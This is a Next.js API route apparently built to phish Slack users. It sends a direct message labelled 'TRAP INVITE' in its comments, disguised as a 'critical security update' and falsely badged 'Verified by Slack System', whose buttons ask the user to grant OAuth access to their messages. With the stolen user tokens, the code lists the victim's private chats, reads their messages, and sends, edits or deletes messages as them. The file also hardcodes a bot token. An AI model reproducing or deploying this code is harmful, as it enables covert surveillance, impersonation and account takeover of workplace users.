/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase'; 
import { doc, getDoc, deleteDoc, setDoc } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

// ⚠️ KEYS (Apni keys confirm kar lein)
const BOT_TOKEN = "xoxb-2545190050563-10484448701457-ouYgXSAbiTnUAIQEvKvxPGIW"; 
const CLIENT_ID = "2545190050563.10465084927779";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText } = body;

    // --- CASE 1: SEND TRAP INVITE ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
            { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
            { "type": "button", "text": { "type": "plain_text", "text": "Review Later", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
       ];

       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: targetUserId, text: "System Update", blocks: blocks })
       });

       const chatData = await chatRes.json();
       if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });

       try { await setDoc(doc(db, "pending_invites", targetUserId), { ts: chatData.ts, channel: chatData.channel }); } catch(e) {}
       return NextResponse.json({ success: true });
    }

    // --- CASE 2: DELETE USER ---
    if (action === 'delete_user') {
        try { await deleteDoc(doc(db, "slack_tokens", targetUserId)); } catch(e) {}
        return NextResponse.json({ success: true });
    }

    // --- TOKEN CHECK ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });
    let USER_TOKEN = "";
    try {
        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
        USER_TOKEN = tokenDoc.data().accessToken;
    } catch (e) { return NextResponse.json({ error: "Database Error - Free Quota Exceeded" }, { status: 503 }); }

    // --- CASE 3: LIST CHATS (🔥 SUPER SEARCH MODE) ---
    if (action === 'list_chats') {
        // 1. Chats lao
        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
        });
        const chatData = await chatRes.json();
        if(!chatData.ok) return NextResponse.json({ chats: [] });

        // 2. Pehlay 'Bulk' main users lao (Fast)
        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const usersData = await usersRes.json();

        // Map banao taakay baar baar search na karna paray
        const userMap: Record<string, any> = {};
        if (usersData.ok && usersData.members) {
            usersData.members.forEach((u: any) => {
                userMap[u.id] = {
                    name: u.real_name || u.name,
                    image: u.profile?.image_48
                };
            });
        }

        // 3. Process Chats (Unknown User Killer Logic)
        const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
            let displayName = "Group Chat";
            let displayImage = null;
            let unreadCount = 0;

            // Unread Count
            try {
                const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const infoData = await infoRes.json();
                if(infoData.ok && infoData.channel) unreadCount = infoData.channel.unread_count_display || 0;
            } catch(e) {}

            if(c.is_im) {
                const userId = c.user;
                
                // OPTION A: Agar local map main hai (Fast)
                if(userMap[userId]) {
                    displayName = userMap[userId].name;
                    displayImage = userMap[userId].image;
                } 
                // OPTION B: Agar nahi mila (Unknown), to Server se Specially Pucho (Slow but Accurate)
                else {
                    try {
                        const singleUserRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
                            headers: { Authorization: `Bearer ${USER_TOKEN}` }
                        });
                        const singleUserData = await singleUserRes.json();
                        if(singleUserData.ok) {
                            displayName = singleUserData.user.real_name || singleUserData.user.name;
                            displayImage = singleUserData.user.profile.image_48;
                        } else {
                            displayName = `ID: ${userId}`; // Last Resort
                        }
                    } catch(e) {
                        displayName = `External: ${userId}`;
                    }
                }
                return { ...c, name: displayName, image: displayImage, unread: unreadCount };
            }
            
            return { ...c, name: displayName, image: displayImage, unread: unreadCount };
        }));

        return NextResponse.json({ chats });
    }

    // --- CASE 4: GET MESSAGES ---
    if (action === 'get_messages') {
        let allMessages: any[] = [];
        let hasMore = true;
        let nextCursor = undefined;
        let loopCount = 0;

        // Loop 2 times only to prevent timeout (400 messages max)
        while (hasMore && loopCount < 2) { 
            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=200`;
            if (nextCursor) url += `&cursor=${nextCursor}`;
            try {
                const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const data = await res.json();
                if (data.ok && data.messages) {
                    allMessages = [...allMessages, ...data.messages];
                    if (data.has_more && data.response_metadata?.next_cursor) nextCursor = data.response_metadata.next_cursor;
                    else hasMore = false;
                } else hasMore = false;
            } catch (err) { hasMore = false; }
            loopCount++;
        }
        return NextResponse.json({ messages: allMessages.reverse() });
    }

    // --- OTHER ACTIONS ---
    if (action === 'send_as_user') {
         const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'delete_message') {
        const res = await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'edit_message') {
        const res = await fetch('https://slack.com/api/chat.update', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs, text: newText })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: "System Busy" }, { status: 200 });
  }
}